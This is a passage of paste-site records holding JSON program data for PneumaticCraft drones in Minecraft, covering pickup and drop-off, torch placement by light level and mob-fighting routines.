cords""},""name"":{""type"":8,""value"":""comment""},""x"":{""type"":3,""value"":-14.0},""y"":{""type"":3,""value"":6.0}},{""name"":{""type"":8,""value"":""coordinate_operator""},""x"":{""type"":3,""value"":-66.0},""variable"":{""type"":8,""value"":""AreaPoint_1""},""checkX"":{""type"":1,""value"":1.0},""y"":{""type"":3,""value"":20.0},""checkY"":{""type"":1,""value"":1.0},""checkZ"":{""type"":1,""value"":1.0},""operator"":{""type"":1,""value"":0.0}},{""posX"":{""type"":3,""value"":2.0},""posY"":{""type"":3,""value"":0.0},""posZ"":{""type"":3,""value"":2.0},""name"":{""type"":8,""value"":""coordinate""},""x"":{""type"":3,""value"":-36.0},""variable"":{""type"":8,""value"":""$drone_pos""},""y"":{""type"":3,""value"":20.0}},{""posX"":{""type"":3,""value"":0.0},""posY"":{""type"":3,""value"":0.0},""useVariable"":{""type"":1,""value"":1.0},""posZ"":{""type"":3,""value"":0.0},""name"":{""type"":8,""value"":""coordinate""},""x"":{""type"":3,""value"":-51.0},""variable"":{""type"":8,""value"":""Deploy_Cord""},""y"":{""type"":3,""value"":20.0}},{""name"":{""type"":8,""value"":""coordinate_operator""},""x"":{""type"":3,""value"":-66.0},""variable"":{""type"":8,""value"":""AreaPoint_2""},""checkX"":{""type"":1,""value"":1.0},""y"":{""type"":3,""value"":31.0},""checkY"":{""type"":1,""value"":1.0},""checkZ"":{""type"":1,""value"":1.0},""operator"":{""type"":1,""value"":0.0}},{""posX"":{""type"":3,""value"":0.0},""posY"":{""type"":3,""value"":0.0},""useVariable"":{""type"":1,""value"":1.0},""posZ"":{""type"":3,""value"":0.0},""name"":{""type"":8,""value"":""coordinate""},""x"":{""type"":3,""value"":-51.0},""variable"":{""type"":8,""value"":""Deploy_Cord""},""y"":{""type"":3,""value"":31.0}},{""posX"":{""type"":3,""value"":-2.0},""posY"":{""type"":3,""value"":5.0},""posZ"":{""type"":3,""value"":-2.0},""name"":{""type"":8,""value"":""coordinate""},""x"":{""type"":3,""value"":-36.0},""variable"":{""type"":8,""value"":""$drone_pos""},""y"":{""type"":3,""value"":31.0}},{""name"":{""type"":8,""value"":""condition_entity""},""x"":{""type"":3,""value"":-66.0},""count"":{""type"":3,""value"":1.0},""y"":{""type"":3,""value"":53.0},""UP"":{""type"":1,""value"":1.0},""operator"":{""type"":1,""value"":1.0}},{""coord1Variable"":{""type"":8,""value"":""AreaPoint_1""},""boxType"":{""type"":1,""value"":0.0},""type"":{""type"":8,""value"":""box""},""z1"":{""type"":3,""value"":0.0},""name"":{""type"":8,""value"":""area""},""x"":{""type"":3,""value"":-51.0},""y1"":{""type"":3,""value"":0.0},""z2"":{""type"":3,""value"":0.0},""y"":{""type"":3,""value"":53.0},""x1"":{""type"":3,""value"":0.0},""y2"":{""type"":3,""value"":0.0},""coord2Variable"":{""type"":8,""value"":""AreaPoint_2""},""x2"":{""type"":3,""value"":0.0}},{""string"":{""type"":8,""value"":""Pickup and Dropoff""},""name"":{""type"":8,""value"":""text""},""x"":{""type"":3,""value"":-51.0},""y"":{""type"":3,""value"":75.0}},{""name"":{""type"":8,""value"":""label""},""x"":{""type"":3,""value"":-65.0},""y"":{""type"":3,""value"":115.0}},{""string"":{""type"":8,""value"":""Suicide""},""name"":{""type"":8,""value"":""text""},""x"":{""type"":3,""value"":-50.0},""y"":{""type"":3,""value"":115.0}},{""name"":{""type"":8,""value"":""suicide""},""x"":{""type"":3,""value"":-65.0},""y"":{""type"":3,""value"":126.0}},{""string"":{""type"":8,""value"":""Suicide""},""name"":{""type"":8,""value"":""text""},""x"":{""type"":3,""value"":-81.0},""y"":{""type"":3,""value"":75.0}},{""string"":{""type"":8,""value"":""Pickup and Dropoff""},""name"":{""type"":8,""value"":""text""},""x"":{""type"":3,""value"":25.0},""y"":{""type"":3,""value"":62.0}},{""name"":{""type"":8,""value"":""label""},""x"":{""type"":3,""value"":10.0},""y"":{""type"":3,""value"":62.0}},{""name"":{""type"":8,""value"":""entity_export""},""x"":{""type"":3,""value"":10.0},""y"":{""type"":3,""value"":95.0}},{""coord1Variable"":{""type"":8,""value"":""AreaPoint_1""},""boxType"":{""type"":1,""value"":0.0},""type"":{""type"":8,""value"":""box""},""z1"":{""type"":3,""value"":0.0},""name"":{""type"":8,""value"":""area""},""x"":{""type"":3,""value"":25.0},""y1"":{""type"":3,""value"":0.0},""z2"":{""type"":3,""value"":0.0},""y"":{""type"":3,""value"":73.0},""x1"":{""type"":3,""value"":0.0},""y2"":{""type"":3,""value"":0.0},""coord2Variable"":{""type"":8,""value"":""AreaPoint_2""},""x2"":{""type"":3,""value"":0.0}},{""name"":{""type"":8,""value"":""coordinate_operator""},""x"":{""type"":3,""value"":-66.0},""variable"":{""type"":8,""value"":""Drop Off Location""},""checkX"":{""type"":1,""value"":1.0},""y"":{""type"":3,""value"":42.0},""checkY"":{""type"":1,""value"":1.0},""checkZ"":{""type"":1,""value"":1.0},""operator"":{""type"":1,""value"":0.0}},{""posX"":{""type"":3,""value"":0.0},""posY"":{""type"":3,""value"":0.0},""useVariable"":{""type"":1,""value"":1.0},""posZ"":{""type"":3,""value"":0.0},""name"":{""type"":8,""value"":""coordinate""},""x"":{""type"":3,""value"":-51.0},""variable"":{""type"":8,""value"":""Deploy_Cord""},""y"":{""type"":3,""value"":42.0}},{""posX"":{""type"":3,""value"":0.0},""posY"":{""type"":3,""value"":100.0},""posZ"":{""type"":3,""value"":0.0},""name"":{""type"":8,""value"":""coordinate""},""x"":{""type"":3,""value"":-36.0},""y"":{""type"":3,""value"":42.0}},{""name"":{""type"":8,""value"":""entity_import""},""x"":{""type"":3,""value"":10.0},""y"":{""type"":3,""value"":73.0}},{""coord1Variable"":{""type"":8,""value"":""Drop Off Location""},""boxType"":{""type"":1,""value"":0.0},""type"":{""type"":8,""value"":""box""},""z1"":{""type"":3,""value"":0.0},""name"":{""type"":8,""value"":""area""},""x"":{""type"":3,""value"":25.0},""y1"":{""type"":3,""value"":0.0},""z2"":{""type"":3,""value"":0.0},""y"":{""type"":3,""value"":95.0},""x1"":{""type"":3,""value"":0.0},""y2"":{""type"":3,""value"":0.0},""coord2Variable"":{""type"":8,""value"":""Drop Off Location""},""x2"":{""type"":3,""value"":0.0}},{""name"":{""type"":8,""value"":""jump""},""x"":{""type"":3,""value"":10.0},""y"":{""type"":3,""value"":117.0}},{""string"":{""type"":8,""value"":""Suicide""},""name"":{""type"":8,""value"":""text""},""x"":{""type"":3,""value"":25.0},""y"":{""type"":3,""value"":117.0}},{""string"":{""type"":8,""value"":""Warning -- If you remove the suicide from this program, an infinite loop will happen""},""name"":{""type"":8,""value"":""comment""},""x"":{""type"":3,""value"":-26.0},""y"":{""type"":3,""value"":129.0}}]}}"
B70it2PJ,Untitled,wastedwander,JSON,Friday 24th of November 2023 01:17:00 AM CDT,"{
  ""pneumaticcraft:progWidgets"": {
    ""type"": 9,
    ""value"": [
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""start""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -149.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -47.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""condition_coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -92.0
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 125.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -77.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Follow""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 125.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Standby""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -107.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 147.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""standby""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -266.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 165.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -266.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 143.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Standby""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -251.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 143.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""teleport""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -266.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 154.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -251.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 154.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""boxType"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""box""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""Charging Station""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""Charging Station""
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""This area needs to be set to your charging station""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""comment""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -100.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -15.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 1.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -77.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Follow""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 136.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Following""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -77.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 147.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 50.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 42.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Light Check""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 65.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 42.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -92.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""Me""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 81.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -77.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 81.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 2.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -62.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 81.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""condition_coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 50.0
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 53.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""DOWN"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""NORTH"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""WEST"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""condition_light""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 261.0
        },
        ""count"": {
          ""type"": 3,
          ""value"": 11.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 106.0
        },
        ""UP"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""SOUTH"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""EAST"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 65.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Torch""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 53.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 1.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 65.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 64.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 276.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 106.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""boxType"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""box""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""Torch2""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""Torch1""
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 261.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""Torch1""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 84.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 276.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 84.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 2.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 5.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 2.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 291.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 84.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 261.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""Torch2""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 95.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 276.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 95.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": -2.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": -2.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": -2.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 291.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 95.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Attack Check""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 276.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 117.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Light Level Check""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 65.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 75.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 261.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 73.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Light Level Check""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 276.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 73.0
        }
      },
      {
        ""maxActions"": {
          ""type"": 3,
          ""value"": 1.0
        },
        ""useMaxActions"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""place""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 261.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 128.0
        },
        ""order"": {
          ""type"": 3,
          ""value"": 1.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 276.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 128.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""boxType"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""box""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""Torch2""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""Torch1""
        }
      },
      {
        ""DOWN"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""NORTH"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""WEST"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""inventory_import""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -267.0
        },
        ""count"": {
          ""type"": 3,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 49.0
        },
        ""UP"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""SOUTH"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""useCount"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""EAST"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -252.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 49.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""boxType"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""box""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""Output Chest""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""Output Chest""
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""condition_coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 48.0
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 111.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 63.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Attack""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 111.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 1.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 63.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 122.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 137.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 119.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Kill Mobs""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 152.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 119.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 137.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""MobScan1""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 130.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 152.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 130.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 10.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 10.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 10.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 167.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 130.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 137.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""MobScan2""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 141.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 152.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 141.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": -10.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": -10.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": -10.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 167.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 141.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
